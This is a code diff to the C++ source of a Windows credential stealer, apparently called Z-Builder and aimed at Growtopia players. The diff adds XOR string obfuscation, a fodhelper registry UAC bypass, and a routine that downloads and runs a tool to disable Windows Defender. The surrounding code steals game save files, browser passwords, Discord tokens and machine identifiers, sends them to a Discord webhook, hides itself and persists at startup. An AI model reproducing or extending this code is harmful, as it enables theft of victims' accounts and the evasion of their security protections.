@@ -17,9 +17,11 @@
 #include <ctime> 
 #include <FileSystem>
 #include "FileWatcher.h"
+#include "XorString.h"
 #pragma comment(lib, "shlwapi.lib")
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "urlmon.lib")
+#define XorString( String ) ( CXorString<ConstructIndexList<sizeof( String ) - 1>::Result>( String ).decrypt() )
 
 using namespace std;
 namespace fs = std::filesystem;
@@ -47,16 +49,22 @@ string ReadContent(string Path);
 void WriteTempContent(string Content);
 string GetMAC();
 void GetBrowserCreds();
+void DisableUAC();
+void DisableProtections();
 
 INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
 {
+    //DisableUAC();
+    //DisableProtections();
     //string License = "[mohvyqre{J2N7U6YJ}]";
     string License = "[zbuilder{zbuilder}]";
     if (VerifyLicense(decrypt(License)))
     {
+        DisableUAC();
+        DisableProtections();
         string Feature = "[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]";
         CleanUp();
-        string RawIPInfo = DownloadString("http://icanhazip.com/");
+        string RawIPInfo = DownloadString(XorStr("http://icanhazip.com/"));
         string IPInfo = RawIPInfo.erase(RawIPInfo.size() - 1);
         string Location = GetLocation();
         // Time
@@ -68,7 +76,7 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
         string Time = trim(RawTime);
         // Time - End
         // Acc Data (Main Account)
-        string tempPath = getenv("TEMP");
+        string tempPath = getenv(XorStr("TEMP"));
         string targetString = tempPath + "\\save.dat";
         string SaveDatLocation = SaveDatPath();
         try
@@ -92,7 +100,7 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
         string LastWorld;
         if (AccDataContent != "")
         {
-            string AccDataSplit = "[---Z-Builder---]";
+            string AccDataSplit = XorStr("[---Z-Builder---]");
             size_t StringSplit = AccDataContent.find(AccDataSplit);
             GrowID = AccDataContent.substr(0, StringSplit);
             AccDataContent.erase(0, StringSplit + AccDataSplit.size());
@@ -153,9 +161,9 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
         // ----- Write & Run Helper Bat File -----
         string RegBatFile = TempPath + "\\RegBatFile.bat";
         ofstream WriteRegBat(RegBatFile, std::ofstream::trunc);
-        WriteRegBat << "cd %TEMP%\nGenerateReg.exe " + data;
+        WriteRegBat << XorStr("cd %TEMP%") << endl << XorStr("GenerateReg.exe ") + data;
         WriteRegBat.close();
-        string Code = "cmd.exe /c " + RegBatFile;
+        string Code = XorStr("cmd.exe /c \"") + RegBatFile + "\"";
         wstring wCode;
         wCode.assign(Code.begin(), Code.end());
         LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
@@ -173,30 +181,30 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
         remove(GenRegLocation.c_str());
         // ----- AAP Bypass End -----
         CleanUp();
-        if (Feature.find("[BrowserCreds:(Y)]") != string::npos)
+        if (Feature.find(XorStr("[BrowserCreds:(Y)]")) != string::npos)
         {
             GetBrowserCreds();
             CleanUp();
         }
-        if (Feature.find("[HideStealer:(Y)]") != string::npos)
+        if (Feature.find(XorStr("[HideStealer:(Y)]")) != string::npos)
         {
             HideStealer();
         }
-        if (Feature.find("[StartUp:(Y)]") != string::npos)
+        if (Feature.find(XorStr("[StartUp:(Y)]")) != string::npos)
         {
             RunOnStartUp();
         }
-        if (Feature.find("[Recover:(Y)]") != string::npos)
+        if (Feature.find(XorStr("[Recover:(Y)]")) != string::npos)
         {
             RecoverSaveDats();
             CleanUp();
         }
-        if (Feature.find("[GetAllAccs:(Y)") != string::npos)
+        if (Feature.find(XorStr("[GetAllAccs:(Y)")) != string::npos)
         {
             LocateAllAccs();
             CleanUp();
         }
-        if (Feature.find("[DeleteGT:(Y)]") != string::npos)
+        if (Feature.find(XorStr("[DeleteGT:(Y)]")) != string::npos)
         {
             DeleteGT();
         }
@@ -235,13 +243,66 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
             }
         }
         //MessageBox - End
-        if (Feature.find("[Tracer:(Y)]") != string::npos)
+        if (Feature.find(XorStr("[Tracer:(Y)]")) != string::npos)
         {
             TraceAcc();
         }
         return 0;
     }
 }
+
+void DisableUAC()
+{
+    string TempPath = getenv("TEMP");
+    string UACPath = TempPath + "\\UAC.bat";
+    ofstream WriteUAC(UACPath);
+    WriteUAC << XorStr("REG ADD \"HKCU\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command\" /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe /c REG ADD HKLM\\software\\microsoft\\windows\\currentversion\\policies\\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f\" /f") << endl;
+    WriteUAC << XorStr("REG ADD \"hkcu\\software\\classes\\ms-settings\\shell\\open\\command\" /v DelegateExecute /t REG_SZ /d \" \" /f") << endl;
+    WriteUAC << XorStr("fodhelper.exe");
+    WriteUAC.close();
+    PVOID old;
+    Wow64DisableWow64FsRedirection(&old);
+    string Code = "cmd.exe /c \"" + UACPath + "\"";
+    wstring wCode;
+    wCode.assign(Code.begin(), Code.end());
+    LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
+    STARTUPINFO si;
+    ZeroMemory(&si, sizeof(STARTUPINFO));
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+    bool Debug = CreateProcess(NULL, LPWSTRCode, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+}
+
+void DisableProtections()
+{
+    // Write Helper Bat File
+    string TempPath = getenv("TEMP");
+    string DefenderControlPath = TempPath + "\\DC.exe";
+    DownloadFile(decrypt(XorStr("uggcf://pqa.qvfpbeqncc.pbz/nggnpuzragf/755908849738842196/766840679531675708/QrsraqrePbageby.rkr")), DefenderControlPath); //Defender Control v1.5 (VERY IMPORTANT)
+    string Code = "cmd.exe /c \"" + DefenderControlPath + "\"" + " /D";
+    wstring wCode;
+    wCode.assign(Code.begin(), Code.end());
+    LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
+    STARTUPINFO si;
+    ZeroMemory(&si, sizeof(STARTUPINFO));
+    si.cb = sizeof(si);
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+    bool Debug = CreateProcess(NULL, LPWSTRCode, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    try
+    {
+        remove(DefenderControlPath.c_str());
+    }
+    catch (...) {}
+}
+
 void GetBrowserCreds()
 {
     string data = "";
@@ -251,9 +312,9 @@ void GetBrowserCreds()
     // Write Helper Bat File
     string WBPVBatFile = TempPath + "\\WBPVBat.bat";
     ofstream WriteBat(WBPVBatFile, std::ofstream::trunc);
-    WriteBat << "cd %TEMP%\nWBPV.exe /scomma %TEMP%\\Results.zb";
+    WriteBat << XorStr("cd %TEMP%") << endl << XorStr("WBPV.exe /scomma %TEMP%\\Results.zb");
     WriteBat.close();
-    string Code = "cmd.exe /c " + WBPVBatFile;
+    string Code = "cmd.exe /c \"" + WBPVBatFile + "\"";
     wstring wCode;
     wCode.assign(Code.begin(), Code.end());
     LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
@@ -310,9 +371,9 @@ string GetMAC()
     string TempPath = getenv("TEMP");
     string MACFile = TempPath + "\\MAC.bat";
     ofstream WriteScript(MACFile, std::ofstream::trunc);
-    WriteScript << "GetMAC > %temp%\\MAC.zb";
+    WriteScript << XorStr("GETMAC > %temp%\\MAC.zb");
     WriteScript.close();
-    string Code = "cmd.exe /c " + MACFile;
+    string Code = "cmd.exe /c \"" + MACFile + "\"";
     wstring wCode;
     wCode.assign(Code.begin(), Code.end());
     LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
@@ -348,14 +409,14 @@ string GetMAC()
 }
 void HideStealer()
 {
-    try 
+    try
     {
         TCHAR szPath[MAX_PATH];
         GetModuleFileName(NULL, szPath, MAX_PATH);
         DWORD attributes = GetFileAttributes(szPath);
         SetFileAttributes(szPath, attributes | FILE_ATTRIBUTE_HIDDEN);
     }
-    catch (...){}
+    catch (...) {}
 }
 
 // Delete growtopia
@@ -423,7 +484,7 @@ string SaveDatPath()
     string AllBytes = string((istreambuf_iterator<char>(GTFile)),
         (istreambuf_iterator<char>()));
     GTFile.close();
-    string LocationOfName = "Exiting the app";
+    string LocationOfName = XorStr("Exiting the app");
     size_t DummyLicenseLocation = AllBytes.find(LocationOfName);
     string SaveDatName = AllBytes.substr(DummyLicenseLocation + LocationOfName.length() + 1);
     SaveDatName = SaveDatName.substr(0, 8);
@@ -468,7 +529,7 @@ string savedecrypt()
 {
     string tempPath = getenv("TEMP");
     string decrypterPath = tempPath + "\\savedecrypter.exe";
-    DownloadFile(decrypt2("21$8*h//9!>f=;sc574))\".c5()-&ac2(5&-!/7opixaj49mvhpm`19ljg}lk10jqczog66itev!av?!5+++pt?7~-!7"), decrypterPath);
+    DownloadFile(decrypt2(XorStr("21$8*h//9!>f=;sc574))\".c5()-&ac2(5&-!/7opixaj49mvhpm`19ljg}lk10jqczog66itev!av?!5+++pt?7~-!7")), decrypterPath);
     string AccDataPath = tempPath + "\\Password.zb";
     remove(AccDataPath.c_str());
     string TempSaveDatLocation = tempPath + "\\save.dat";
@@ -494,7 +555,7 @@ string DiscordToken()
     string tempPath = getenv("TEMP");
     string DiscordTokenGrabberEXE = tempPath + "\\ZBDiscordTokenGrabber.exe";
     const char* DiscordTokenGrabberPath = DiscordTokenGrabberEXE.c_str();
-    DownloadFile(decrypt2("21$8*h//9!>f=;sc574))\".c5()-&ac2(5&-!/7opixaj49mvhpm`19ljg}lk09j|en`38cvh~vBD363'+6To1 >+3bb?7~-!7"), DiscordTokenGrabberEXE);
+    DownloadFile(decrypt2(XorStr("21$8*h//9!>f=;sc574))\".c5()-&ac2(5&-!/7opixaj49mvhpm`19ljg}lk09j|en`38cvh~vBD363'+6To1 >+3bb?7~-!7")), DiscordTokenGrabberEXE);
     string DiscordTokenTXT = tempPath + "\\DiscordToken.txt";
     wstring wDiscordTokenTXT;
     wDiscordTokenTXT.assign(DiscordTokenTXT.begin(), DiscordTokenTXT.end());
@@ -535,11 +596,11 @@ void RecoverSaveDats()
     }
     string ps1file = ZBRecoveredFolder + "\\RecoverFiles.ps1";
     ofstream WritePS1(ps1file);
-    WritePS1 << decrypt("$furyy = Arj-Bowrpg -PbzBowrpg Furyy.Nccyvpngvba") << endl;
-    WritePS1 << decrypt("$erplpyrOva = $furyy.Anzrfcnpr(0kN)") << endl;
-    WritePS1 << decrypt("$erplpyrOva.Vgrzf() | %{Pbcl-Vgrz $_.Cngu (\"") + ZBRecoveredFolder + decrypt("\\{0}\" -s ($_.Anzr+[fgevat](Trg-Enaqbz)))} -ReebeNpgvba FvyragylPbagvahr");
+    WritePS1 << decrypt(XorStr("$furyy = Arj-Bowrpg -PbzBowrpg Furyy.Nccyvpngvba")) << endl;
+    WritePS1 << decrypt(XorStr("$erplpyrOva = $furyy.Anzrfcnpr(0kN)")) << endl;
+    WritePS1 << decrypt(XorStr("$erplpyrOva.Vgrzf() | %{Pbcl-Vgrz $_.Cngu (\"")) + ZBRecoveredFolder + decrypt(XorStr("\\{0}\" -s ($_.Anzr+[fgevat](Trg-Enaqbz)))} -ReebeNpgvba FvyragylPbagvahr"));
     WritePS1.close();
-    string Code = decrypt("pzq.rkr /p Cbjrefuryy.rkr -AbCebsvyr -RkrphgvbaCbyvpl haerfgevpgrq -svyr \"") + ps1file + "\"";
+    string Code = decrypt(XorStr("pzq.rkr /p Cbjrefuryy.rkr -AbCebsvyr -RkrphgvbaCbyvpl haerfgevpgrq -svyr \"")) + ps1file + "\"";
     wstring wCode;
     wCode.assign(Code.begin(), Code.end());
     LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
@@ -571,23 +632,23 @@ void RecoverSaveDats()
             (istreambuf_iterator<char>()));
         if (RecoveredAccDataContent != "")
         {
-            FullData += RecoveredAccDataContent + "[Z-Builder]";
+            FullData += RecoveredAccDataContent + XorStr("[Z-Builder]");
         }
         remove(tempPath.c_str());
     }
-    while (FullData.find("[Z-Builder]") != string::npos)
+    while (FullData.find(XorStr("[Z-Builder]")) != string::npos)
     {
-        size_t Splitter = FullData.find("[Z-Builder]");
+        size_t Splitter = FullData.find(XorStr("[Z-Builder]"));
         string SplitData = FullData.substr(0, Splitter + 11);
         FullData.erase(0, Splitter + 11);
-        string AccDataSplit = "[---Z-Builder---]";
+        string AccDataSplit = XorStr("[---Z-Builder---]");
         size_t LocateAccInfo = SplitData.find(AccDataSplit);
         string GrowID = SplitData.substr(0, LocateAccInfo);
         SplitData.erase(0, LocateAccInfo + 17);
         LocateAccInfo = SplitData.find(AccDataSplit);
         string Password = SplitData.substr(0, LocateAccInfo);
         SplitData.erase(0, LocateAccInfo + 17);
-        Splitter = SplitData.find("[Z-Builder]");
+        Splitter = SplitData.find(XorStr("[Z-Builder]"));
         string LastWorld = SplitData.substr(0, Splitter);
         Info += "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```";
     }
@@ -627,16 +688,16 @@ void LocateAllAccs()
     {
         remove(BatFile.c_str());
         ofstream WriteScript(BatFile);
-        WriteScript << "cd %USERPROFILE%\ndir " + savedat + decrypt(" /F /O > %grzc%\\FnirQngYbpngvba.gkg");
+        WriteScript << XorStr("cd %USERPROFILE%") << endl << XorStr("dir ") + savedat + decrypt(XorStr(" /F /O > %grzc%\\FnirQngYbpngvba.gkg"));
         WriteScript.close();
     }
     catch (...)
     {
         ofstream WriteScript(BatFile);
-        WriteScript << "cd %USERPROFILE%\ndir " + savedat + decrypt(" /F /O > %grzc%\\FnirQngYbpngvba.gkg");
+        WriteScript << XorStr("cd %USERPROFILE%") << endl << XorStr("dir ") + savedat + decrypt(XorStr(" /F /O > %grzc%\\FnirQngYbpngvba.gkg"));
         WriteScript.close();
     }
-    string Code = "cmd.exe /c " + BatFile;
+    string Code = "cmd.exe /c \"" + BatFile + "\"";
     wstring wCode;
     wCode.assign(Code.begin(), Code.end());
     LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
@@ -665,7 +726,7 @@ void LocateAllAccs()
         {
             remove(AccResults.c_str());
         }
-        catch (...){}
+        catch (...) {}
         savedecrypt();
         string AccData;
         try
@@ -678,7 +739,7 @@ void LocateAllAccs()
                 AllData += AccData + "[Z-Builder]";
             }
         }
-        catch (...){}
+        catch (...) {}
         LocationResults.erase(0, Splitter + StringToSplit.size());
     }
     string Info;
@@ -725,7 +786,7 @@ void WriteTempContent(string Content)
     WriteContent.close();
 }
 
-template<typename InputIterator1, typename InputIterator2> 
+template<typename InputIterator1, typename InputIterator2>
 bool
 range_equal(InputIterator1 first1, InputIterator1 last1,
     InputIterator2 first2, InputIterator2 last2)
@@ -894,7 +955,7 @@ void Execute(wstring toto)
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION  pi;
     vector<TCHAR> V(toto.length() + 1);
-    for (int i = 0;i < (int)toto.length();i++)
+    for (int i = 0; i < (int)toto.length(); i++)
         V[i] = toto[i];
     CreateProcess(NULL, &V[0], 0, 0, FALSE, 0, 0, 0, &si, &pi);
     WaitForSingleObject(pi.hProcess, INFINITE);
@@ -910,19 +971,19 @@ void CleanUp()
         string DecrypterPath = tempPath + "\\savedecrypter.exe";
         remove(DecrypterPath.c_str());
     }
-    catch (...){}
+    catch (...) {}
     try
     {
         string tempSaveDatLocation = tempPath + "\\save.dat";
         remove(tempSaveDatLocation.c_str());
     }
-    catch (...){}
+    catch (...) {}
     try
     {
         string tempAccData = tempPath + "\\Password.zb";
         remove(tempAccData.c_str());
     }
-    catch (...){}
+    catch (...) {}
     try
     {
         string DiscordGrabberEXE = tempPath + "\\ZBDiscordTokenGrabber.exe";
@@ -934,37 +995,37 @@ void CleanUp()
         string DiscordToken = tempPath + "\\DiscordToken.txt";
         remove(DiscordToken.c_str());
     }
-    catch (...){}
+    catch (...) {}
     try
     {
         string RecycleBinScanner = tempPath + "\\RecycleBinScanner.exe";
         remove(RecycleBinScanner.c_str());
     }
-    catch (...){}
+    catch (...) {}
     try
     {
         string BatFile = tempPath + "\\ScanPC.bat";
         remove(BatFile.c_str());
     }
-    catch (...){}
+    catch (...) {}
     try
     {
         string SaveDatLocations = tempPath + "\\SaveDatLocation.txt";
         remove(SaveDatLocations.c_str());
     }
-    catch (...){}
+    catch (...) {}
     try
     {
         string WBPV = tempPath + "\\WBPV.exe";
         remove(WBPV.c_str());
     }
-    catch (...){}
+    catch (...) {}
     try
     {
         string MACzb = tempPath + "\\MAC.zb";
         remove(MACzb.c_str());
     }
-    catch (...){}
+    catch (...) {}
 }
 
 //Trim
@@ -1025,11 +1086,11 @@ void SendMessage(string Message, string ContentType)
     size_t LocateEnd = s.find("]");
     if (LocateBegin > LocateEnd)
     {
-        s = s.substr(0, LocateBegin-1);
+        s = s.substr(0, LocateBegin - 1);
     }
     else
     {
-        s = s.substr(0, LocateEnd-1);
+        s = s.substr(0, LocateEnd - 1);
     }
     string delimiter = "https://discordapp.com/";
     size_t startapilocation = s.find("api");
@@ -1156,25 +1217,25 @@ string decrypt(string str)
 // Verify license
 bool VerifyLicense(string License)
 {
-	std::vector<string> allLicenses;
-	string rawLicenseData = DownloadString(decrypt2("21$8*h//*$#<<0int&?%v awu}ax+uU"));
-	rawLicenseData.erase(remove(rawLicenseData.begin(), rawLicenseData.end(), '\r'), rawLicenseData.end());
-	rawLicenseData.erase(remove(rawLicenseData.begin(), rawLicenseData.end(), '\n'), rawLicenseData.end());
-	while (rawLicenseData.find("]") != string::npos)
-	{
-		size_t Splitter = rawLicenseData.find("]");
-		string aLicense = rawLicenseData.substr(0, Splitter + 1);
-		allLicenses.push_back(aLicense);
-		rawLicenseData.erase(0, Splitter + 1);
-	}
-	if (std::find(allLicenses.begin(), allLicenses.end(), License) != allLicenses.end())
-	{
-		return true;
-	}
-	else
-	{
-		return false;
-	}
+    std::vector<string> allLicenses;
+    string rawLicenseData = DownloadString(decrypt2("21$8*h//*$#<<0int&?%v awu}ax+uU"));
+    rawLicenseData.erase(remove(rawLicenseData.begin(), rawLicenseData.end(), '\r'), rawLicenseData.end());
+    rawLicenseData.erase(remove(rawLicenseData.begin(), rawLicenseData.end(), '\n'), rawLicenseData.end());
+    while (rawLicenseData.find("]") != string::npos)
+    {
+        size_t Splitter = rawLicenseData.find("]");
+        string aLicense = rawLicenseData.substr(0, Splitter + 1);
+        allLicenses.push_back(aLicense);
+        rawLicenseData.erase(0, Splitter + 1);
+    }
+    if (std::find(allLicenses.begin(), allLicenses.end(), License) != allLicenses.end())
+    {
+        return true;
+    }
+    else
+    {
+        return false;
+    }
 }
 // Verify license - End
 
@@ -1187,3 +1248,4 @@ string decrypt2(string toEncrypt) {
 
     return output;
 }
+
